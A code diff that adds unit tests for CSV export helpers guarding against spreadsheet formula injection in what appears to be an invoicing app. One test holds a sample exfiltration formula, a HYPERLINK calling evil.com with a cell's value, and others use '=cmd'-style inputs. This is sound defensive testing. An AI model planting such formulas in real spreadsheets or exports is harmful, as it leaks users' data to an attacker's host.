@@ -1,5 +1,5 @@
 import { describe, it, expect } from "vitest";
-import { fmt, fmtDate, fmtShort, fmtRelative, dueDelta, escHtml, DEFAULT_REORDER, balanceDue } from "./utils.js";
+import { fmt, fmtDate, fmtShort, fmtRelative, dueDelta, escHtml, DEFAULT_REORDER, balanceDue, csvCell, buildCsv } from "./utils.js";
 
 describe("fmt", () => {
   it("formats numbers as GBP currency", () => {
@@ -105,5 +105,45 @@ describe("balanceDue", () => {
   it("returns 0 for a null/undefined invoice", () => {
     expect(balanceDue(null)).toBe(0);
     expect(balanceDue(undefined)).toBe(0);
+  });
+});
+
+// Audit item #9: CSV export must neutralise formula injection and quote safely.
+describe("csvCell", () => {
+  it("neutralises a leading = formula", () => {
+    expect(csvCell("=1+1")).toBe(`"'=1+1"`);
+  });
+  it("neutralises leading @ and +/- followed by a function", () => {
+    expect(csvCell("@SUM(A1)")).toBe(`"'@SUM(A1)"`);
+    expect(csvCell("+HYPERLINK(1)")).toBe(`"'+HYPERLINK(1)"`);
+    expect(csvCell("-HYPERLINK(1)")).toBe(`"'-HYPERLINK(1)"`); // '-' + non-digit → neutralised
+  });
+  it("neutralises a classic exfiltration payload", () => {
+    expect(csvCell('=HYPERLINK("http://evil.com?"&A1,"click")').startsWith(`"'=`)).toBe(true);
+  });
+  it("leaves plain numbers and negatives untouched", () => {
+    expect(csvCell("1837.50")).toBe(`"1837.50"`);
+    expect(csvCell("-5.00")).toBe(`"-5.00"`);
+    expect(csvCell(42)).toBe(`"42"`);
+  });
+  it("leaves a phone number starting with + untouched", () => {
+    expect(csvCell("+447911123456")).toBe(`"+447911123456"`);
+  });
+  it("quotes and escapes commas, quotes and newlines", () => {
+    expect(csvCell("Smith, John")).toBe(`"Smith, John"`);
+    expect(csvCell('a "quote"')).toBe(`"a ""quote"""`);
+    expect(csvCell("line1\nline2")).toBe(`"line1\nline2"`);
+  });
+  it("handles null/undefined/empty", () => {
+    expect(csvCell(null)).toBe(`""`);
+    expect(csvCell(undefined)).toBe(`""`);
+    expect(csvCell("")).toBe(`""`);
+  });
+});
+
+describe("buildCsv", () => {
+  it("joins a header and rows with CRLF, every cell sanitised", () => {
+    const out = buildCsv(["Name", "Amount"], [["=cmd", "10"], ["Smith, J", "-5"]]);
+    expect(out).toBe(`"Name","Amount"\r\n"'=cmd","10"\r\n"Smith, J","-5"`);
   });
 });
